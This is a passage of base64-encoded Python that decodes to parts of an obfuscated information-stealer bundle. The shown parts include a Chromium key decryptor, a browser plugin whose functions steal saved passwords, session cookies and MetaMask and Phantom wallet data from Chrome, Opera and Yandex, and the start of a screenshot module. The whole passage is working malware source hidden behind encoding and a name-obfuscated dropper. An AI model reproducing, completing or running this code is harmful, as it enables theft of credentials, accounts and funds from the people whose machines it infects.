lxyXG4gICAgICAgIHAgPSBjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIoZW5jcnlwdGVkLCBsZW4oZW5jcnlwdGVkKSlcclxuICAgICAgICBibG9iaW4gPSBEQVRBX0JMT0IoY3R5cGVzLnNpemVvZihwKSwgcClcclxuICAgICAgICBibG9ib3V0ID0gREFUQV9CTE9CKClcclxuICAgICAgICByZXR2YWwgPSBjdHlwZXMud2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKFxyXG4gICAgICAgICAgICBjdHlwZXMuYnlyZWYoYmxvYmluKSwgTm9uZSwgTm9uZSwgTm9uZSwgTm9uZSwgMCwgY3R5cGVzLmJ5cmVmKGJsb2JvdXQpKVxyXG4gICAgICAgIGlmIG5vdCByZXR2YWw6XHJcbiAgICAgICAgICAgIHJhaXNlIGN0eXBlcy5XaW5FcnJvcigpXHJcbiAgICAgICAgcmVzdWx0ID0gY3R5cGVzLnN0cmluZ19hdChibG9ib3V0LnBiRGF0YSwgYmxvYm91dC5jYkRhdGEpXHJcbiAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUoYmxvYm91dC5wYkRhdGEpXHJcbiAgICAgICAgcmV0dXJuIHJlc3VsdFxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBkZWNyeXB0KGNpcGhlciwgY2lwaGVydGV4dCwgbm9uY2UpOlxyXG4gICAgICAgIGNpcGhlci5tb2RlID0gbW9kZXMuR0NNKG5vbmNlKVxyXG4gICAgICAgIGRlY3J5cHRvciA9IGNpcGhlci5kZWNyeXB0b3IoKVxyXG4gICAgICAgIHJldHVybiBkZWNyeXB0b3IudXBkYXRlKGNpcGhlcnRleHQpXHJcblxyXG4gICAgZGVmIGdldF9rZXlfZnJvbV9sb2NhbF9zdGF0ZShzZWxmKTpcclxuICAgICAgICBqc24gPSBOb25lXHJcbiAgICAgICAgd2l0aCBvcGVuKHNlbGYucGF0aCwgXCdyXCcpIGFzIGY6XHJcbiAgICAgICAgICAgIGpzbiA9IGpzb24ubG9hZHMoc3RyKGYucmVhZGxpbmUoKSkpXHJcbiAgICAgICAgcmV0dXJuIGpzbltcJ29zX2NyeXB0XCddW1wnZW5jcnlwdGVkX2tleVwnXVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfY2lwaGVyKGtleSk6XHJcbiAgICAgICAgY2lwaGVyID0gQ2lwaGVyKFxyXG4gICAgICAgICAgICBhbGdvcml0aG1zLkFFUyhrZXkpLFxyXG4gICAgICAgICAgICBOb25lLFxyXG4gICAgICAgICAgICBiYWNrZW5kPWRlZmF1bHRfYmFja2VuZCgpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBjaXBoZXJcclxuXHJcbiAgICBkZWYgYWVzX2RlY3J5cHQoc2VsZiwgZW5jcnlwdGVkX3R4dCk6XHJcbiAgICAgICAgaWYgc2VsZi5rZXkgaXMgTm9uZTpcclxuICAgICAgICAgICAgZW5jb2RlZF9rZXkgPSBzZWxmLmdldF9rZXlfZnJvbV9sb2NhbF9zdGF0ZSgpXHJcbiAgICAgICAgICAgIGVuY3J5cHRlZF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfa2V5LmVuY29kZSgpKVxyXG4gICAgICAgICAgICBlbmNyeXB0ZWRfa2V5ID0gZW5jcnlwdGVkX2tleVs1Ol1cclxuICAgICAgICAgICAgc2VsZi5rZXkgPSBEZWNyeXB0b3IuZHBhcGlfZGVjcnlwdChlbmNyeXB0ZWRfa2V5KVxyXG4gICAgICAgICAgICBzZWxmLmNpcGhlciA9IERlY3J5cHRvci5nZXRfY2lwaGVyKHNlbGYua2V5KVxyXG4gICAgICAgIFxyXG4gICAgICAgIG5vbmNlID0gZW5jcnlwdGVkX3R4dFszOjE1XVxyXG5cclxuICAgICAgICByZXR1cm4gRGVjcnlwdG9yLmRlY3J5cHQoc2VsZi5jaXBoZXIsZW5jcnlwdGVkX3R4dFsxNTpdLG5vbmNlKVxyXG5cclxuICAgIGRlZiBkZWNyeXB0X3Bhc3N3b3JkKHNlbGYsIGRhdGEpOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgZGF0YVs6NF0gPT0gYlwnXFx4MDFcXHgwMFxceDAwXFx4MDBcJzpcclxuICAgICAgICAgICAgICAgIGRlY3J5cHRlZCA9IERlY3J5cHRvci5kcGFwaV9kZWNyeXB0KGRhdGEpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkLmRlY29kZSgpXHJcbiAgICAgICAgICAgIGVsaWYgZGF0YVs6M10gPT0gYlwndjEwXCc6XHJcbiAgICAgICAgICAgICAgICBkZWNyeXB0ZWQgPSBzZWxmLmFlc19kZWNyeXB0KGRhdGEpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkWzotMTZdLmRlY29kZSgpXHJcbiAgICAgICAgZXhjZXB0OlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZScpI2xpbmU6NTYKICAgIF9fT09PMDAwMDBPTzBPMDAwME8gKCdwbHVnaW5zL2Jyb3dzZXJzL0Nocm9taXVtLnB5JyxiImZyb20gYXN5bmNpbyBpbXBvcnQgVGFzaywgY3JlYXRlX3Rhc2tcclxuZnJvbSB0eXBpbmcgaW1wb3J0IExpc3RcclxuZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zIGltcG9ydCBzY2FuZGlyLCBta2RpclxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW4sIGlzZGlyLCBpc2ZpbGUsIHNwbGl0XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZSwgX2hhbmRsZV90YXNrX3Jlc3VsdFxyXG5mcm9tIHBhdGhfc2VhcmNoIGltcG9ydCBzZWFyY2hfcGF0aHNcclxuaW1wb3J0IGFpb3NxbGl0ZVxyXG5mcm9tIC5kZWNyeXB0IGltcG9ydCBEZWNyeXB0b3JcclxuZnJvbSB0aW1lIGltcG9ydCB0aW1lXHJcbmZyb20gcGF0aHMgaW1wb3J0IFRFTVBcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlblxyXG5cclxuXHJcblxyXG5jbGFzcyBDaHJvbWl1bShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBOb25lXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzZXRfZGVjcnlwdG9yKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGxvY2FsX3N0YXRlX2ZvbGRlcnMgPSB7XHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJyksXHJcbiAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgbG9jYWxfc3RhdGVzID0gW11cclxuICAgICAgICBhc3luYyBmb3IgaSBpbiBzZWFyY2hfcGF0aHMobG9jYWxfc3RhdGVfZm9sZGVycywgeydMb2NhbCBTdGF0ZSd9KTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVzLmFwcGVuZChpKVxyXG5cclxuICAgICAgICBpZiBsb2NhbF9zdGF0ZXM6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlX3BhdGggPSBsb2NhbF9zdGF0ZXNbMF1cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gTm9uZVxyXG5cclxuICAgICAgICBzZWxmLmRlY3J5cHRvciA9IERlY3J5cHRvcihsb2NhbF9zdGF0ZV9wYXRoKVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfcGFzc3dvcmQoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICByb3dzID0gW11cclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICBsb2dpbl9kYXRhX2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMobG9naW5fZGF0YV9mb2xkZXJfcGF0aHMsIHsnTG9naW4gRGF0YSd9KTpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNmaWxlKHApOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidMb2dpbiBEYXRhIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLmRlY3J5cHRvcjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3FsID0gJ3NlbGVjdCAqIGZyb20gbG9naW5zJ1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNvbm4uZXhlY3V0ZShzcWwpIGFzIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYyBmb3Igcm93IGluIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dzLmFwcGVuZCgocm93WzFdLCByb3dbM10sIHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKSkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YjRceGQwXHhiNVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJmXHhkMVx4ODJceGQwXHhiNSBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMVx4OGYsIHtlfScpXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGJmXHhkMFx4YmVceGQwXHhiZlx4ZDFceDhiXHhkMVx4ODJceGQwXHhiYVx4ZDBceGI1IFx4ZDFceDgxXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjRceGQwXHhiOFx4ZDFceDgyXHhkMVx4OGMgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDBceGI4IFx4ZDFceDgxIHtwfSwgXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIHtlfScpXHJcblxyXG4gICAgICAgICAgICBpZiByb3dzOlxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgICAgIHBhc3N3b3Jkc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdwYXNzd29yZHMnKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IGpvaW4ocGFzc3dvcmRzX3BhdGgsIG5hbWUpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHBhc3N3b3Jkc19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2RpcihwYXNzd29yZHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICAgICAgZm9yIHVybCwgbG9naW4sIHBhc3N3b3JkIGluIHJvd3M6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZidVUkw6IHt1cmx9XFxuTG9naW46IHtsb2dpbn1cXG5QYXNzd29yZDoge3Bhc3N3b3JkfVxcblxcbicpXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQwXHhiOCBceGQxXHg4MSB7cm9vdF9wYXRofScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIHN0ZWFsX3Bhc3N3b3JkOiB7ZX0nKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF9jb29raWVzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIGNvb2tpZXMgPSAnJ1xyXG5cclxuICAgICAgICAgICAgY29va2llX2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbmV0d29yaycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMoY29va2llX2ZvbGRlcl9wYXRocywgeydDb29raWVzJywgJ2Nvb2tpZXMuc3FsaXRlJ30pOlxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZmlsZShwKTpcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidDb29raWVzIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKHAsIHRlbXBfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICBzcWwgPSAnc2VsZWN0ICogZnJvbSBjb29raWVzJ1xyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggY29ubi5leGVjdXRlKHNxbCkgYXMgY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgZm9yIHJvdyBpbiBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udiA9IGxhbWJkYSB4OiAnVFJVRScgaWYgeCBlbHNlICdGQUxTRSdcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaG9zdCA9IHJvd1sxXVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0dHBfb25seSA9IGNvbnYocm93WzldKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSByb3dbNl1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWN1cmUgPSBjb252KHJvd1s4XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHBpcmF0aW9uX2RhdGUgPSBzdHIocm93WzddKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSByb3dbM11cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiNFx4ZDBceGI1XHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmZceGQxXHg4Mlx4ZDBceGI1IFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGIwLCB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdmFsdWU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAnJ1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZSA9ICdcXHQnLmpvaW4oXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKGhvc3QsIGh0dHBfb25seSwgcGF0aCwgc2VjdXJlLCBleHBpcmF0aW9uX2RhdGUsIG5hbWUsIHZhbHVlKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXMgKz0gY29va2llICsgJ1xcbidcclxuXHJcbiAgICAgICAgICAgIGlmIGNvb2tpZXM6XHJcbiAgICAgICAgICAgICAgICBuYW1lID0gZid7c3BsaXQocm9vdF9wYXRoKVsxXX1fe3Rva2VuX2hleCg1KX0udHh0J1xyXG4gICAgICAgICAgICAgICAgY29va2llc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdjb29raWVzJylcclxuICAgICAgICAgICAgICAgIHBhdGggPSBqb2luKGNvb2tpZXNfcGF0aCwgbmFtZSlcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKGNvb2tpZXNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIoY29va2llc19wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggb3BlbihwYXRoLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGNvb2tpZXMpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGI4IFx4ZDFceDgxIHtyb290X3BhdGh9JylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gc3RlYWxfY29va2llczoge2V9JylcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX3dhbGxldHMoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgd2FsbGV0X2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICB3YWxsZXRzID0ge1xyXG4gICAgICAgICAgICAgICAgJ25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJzogJ21ldGFtYXNrJyxcclxuICAgICAgICAgICAgICAgICdiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYSc6ICdwaGFudG9tJ1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMod2FsbGV0X2ZvbGRlcl9wYXRocywgc2V0KHdhbGxldHMua2V5cygpKSk6XHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3YWxsZXRzJylcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcih3YWxsZXRzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBuYW1lID0gc3BsaXQocClbMV1cclxuICAgICAgICAgICAgICAgIHdhbGxldF9uYW1lID0gd2FsbGV0c1tuYW1lXVxyXG4gICAgICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbih3YWxsZXRzX3BhdGgsIGYne3dhbGxldF9uYW1lfV97dG9rZW5faGV4KDQpfScpXHJcblxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHl0cmVlKHAsIGRlc3RfcGF0aClcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICBwYXNzXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZCBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDFceDhjIFx4ZDFceDgxIHtwfScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YmZceGQwXHhiZVx4ZDBceGJmXHhkMVx4OGJceGQxXHg4Mlx4ZDBceGJhXHhkMFx4YjUgXHhkMVx4ODFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNFx4ZDBceGI4XHhkMVx4ODJceGQxXHg4YyBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDBceGI1XHhkMFx4YmEge3Jvb3RfcGF0aH0nKVxyXG4gICAgXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBjaHJvbWl1bV9icm93c2VyX25hbWVzID0ge1xyXG4gICAgICAgICAgICAnb3BlcmEgZ3ggc3RhYmxlJyxcclxuICAgICAgICAgICAgJ29wZXJhIHN0YWJsZScsXHJcbiAgICAgICAgICAgICdjaHJvbWUnLFxyXG4gICAgICAgICAgICAneWFuZGV4YnJvd3NlcidcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHRhc2tzOiBMaXN0W1Rhc2tdID0gW11cclxuXHJcbiAgICAgICAgZm9yIGZvbGRlcl9uYW1lIGluIGNocm9taXVtX2Jyb3dzZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIHNjYW5kaXIocGF0aCkpOlxyXG4gICAgICAgICAgICByb290X3BhdGggPSBqb2luKHBhdGgsIGZvbGRlcl9uYW1lKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF9wYXNzd29yZChyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfY29va2llcyhyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfd2FsbGV0cyhyb290X3BhdGgpKSlcclxuXHJcbiAgICAgICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgICAgIHRhc2suYWRkX2RvbmVfY2FsbGJhY2sobGFtYmRhIHg6IF9oYW5kbGVfdGFza19yZXN1bHQoeCwgc2VsZi5jb25mLmxvZ2dlcikpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCB0YXNrXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gY2hyb21pdW0gdGFza3M6IHtlfScpXHJcbiAgICAgICAgICAgICAgICAiKSNsaW5lOjU3CiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGx1Z2lucy9kZXRhaWxzLnB5JyxiImZyb20gYXN5bmNpbyBpbXBvcnQgY3JlYXRlX3Rhc2tcclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5pbXBvcnQgb3NcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luXHJcbmltcG9ydCBwbGF0Zm9ybVxyXG5mcm9tIGFpb2ZpbGVzIGltcG9ydCBvcGVuXHJcbmZyb20gbXNzLndpbmRvd3MgaW1wb3J0IE1TUyBhcyBtc3NcclxuZnJvbSB0b29scyBpbXBvcnQgbW92ZVxyXG5cclxuXHJcblxyXG5jbGFzcyBEZXRhaWxzKCk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcbiAgICBhc3luYyBkZWYgdGFrZV9zY3JlZW5zaG90KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgd2l0aCBtc3MoKSBhcyBzY3Q6XHJcbiAgICAgICAgICAgIGZvciBmaWxlbmFtZSBpbiBzY3Quc2F2ZSgp